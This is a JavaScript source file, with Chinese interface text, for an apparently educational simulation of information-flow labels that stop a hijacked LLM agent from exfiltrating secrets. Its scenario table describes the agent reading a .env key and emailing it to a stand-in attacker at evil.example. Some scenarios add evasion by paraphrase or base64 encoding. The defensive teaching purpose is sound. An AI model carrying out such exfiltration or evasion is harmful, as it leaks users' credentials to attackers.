registerSim('a21ifc', function (el) {
  var FLOWS = {
    benign:  { label: '一个公开页面的摘要', to: 'team@corp', audience: 'internal',
               sources: ['untrusted_web'], readers: ['public', 'internal', 'user'], steps: ['http_get(url) → src=untrusted_web, readers={public,internal,user}', 'derive: summary → 标签原样不变'] },
    exfil:   { label: '原始密钥', to: 'a@evil.example', audience: 'public',
               sources: ['local_secret'], readers: ['user'], steps: ['read_file(.env) → src=local_secret, readers={user}'] },
    launder: { label: '密钥的一段改写', to: 'a@evil.example', audience: 'public',
               sources: ['local_secret'], readers: ['user'], steps: ['read_file(.env) → src=local_secret, readers={user}', 'derive: "大致来说，密钥是 sk_live_…。" → 标签照样带下去'] },
    mix:     { label: '把密钥埋进去的摘要', to: 'team@corp', audience: 'internal',
               sources: ['local_secret', 'untrusted_web'], readers: ['user'], steps: ['summary readers = {public,internal,user}', 'secret  readers = {user}', 'derive(summary, secret) → readers = 交集 = {user}'] },
    encode:  { label: '密钥的 base64', to: 'a@evil.example', audience: 'public',
               sources: ['local_secret'], readers: ['user'], steps: ['read_file(.env) → src=local_secret, readers={user}', 'derive: b64(secret) → 标签照样带下去（值变了，溯源没变）'] }
  };
  var f = el.querySelector('#a21-flow'), on = el.querySelector('#a21-ifc'), o = el.querySelector('#a21-out');

  function render() {
    var x = FLOWS[f.value], enabled = on.checked;
    var allowed = !enabled || x.readers.indexOf(x.audience) !== -1;

    var h = '<span class="dim">派生过程</span>\n';
    x.steps.forEach(function (s) { h += '  ' + simUtil.esc(s) + '\n'; });
    h += '\n<span class="dim">汇点上的值</span>\n';
    h += '  内容      ' + x.label + '\n';
    h += '  来源      [' + x.sources.join(', ') + ']\n';
    h += '  读者      {' + x.readers.join(', ') + '}\n\n';
    h += '<span class="dim">send_email(to=' + x.to + ')</span>   受众 = ' + x.audience + '\n\n';

    if (!enabled) {
      h += '  <span class="bad">已发送。</span>没有策略：汇点根本不知道这些字节从哪里来。\n';
      if (f.value !== 'benign') h += '  <span class="bad">密钥现在在攻击者手里了。</span>\n';
    } else if (allowed) {
      h += '  <span class="ok">允许。</span>' + x.audience + ' ∈ readers，数据可以送到这个受众。\n';
    } else {
      h += '  <span class="ok">PolicyViolation：</span>不能把派生自 [' + x.sources.join(', ') + '] 的数据\n';
      h += '  发给 \'' + x.to + '\'（受众 \'' + x.audience + '\'）：允许的读者是 {' + x.readers.join(', ') + '}\n';
    }

    if (enabled && f.value === 'launder')
      h += '\n  <span class="hl">改写洗不掉标签。</span>这个值派生自密钥，所以不管怎么措辞，\n  它都继承密钥的溯源。';
    if (enabled && f.value === 'encode')
      h += '\n  <span class="hl">结果和明文那一档完全一样。</span>策略从不解码任何东西，因为它压根\n  不看这个值，所以整个编码空间坍缩成了一种情况。';
    if (enabled && f.value === 'mix')
      h += '\n  <span class="hl">混合会收窄受众。</span>公开摘要加上只对用户可见的密钥，结果就是\n  只对用户可见。这就是读者取交集而不是并集的原因。';
    if (enabled && f.value !== 'benign')
      h += '\n\n  <span class="dim">注意哪些东西没被查阅：模型的判断（它已经被劫持了）、指令的文本、\n  任何阈值。这里没有任何东西可供一个更高明的载荷去攻破。</span>';
    o.innerHTML = h;
  }
  f.onchange = render; on.onchange = render; render();
});
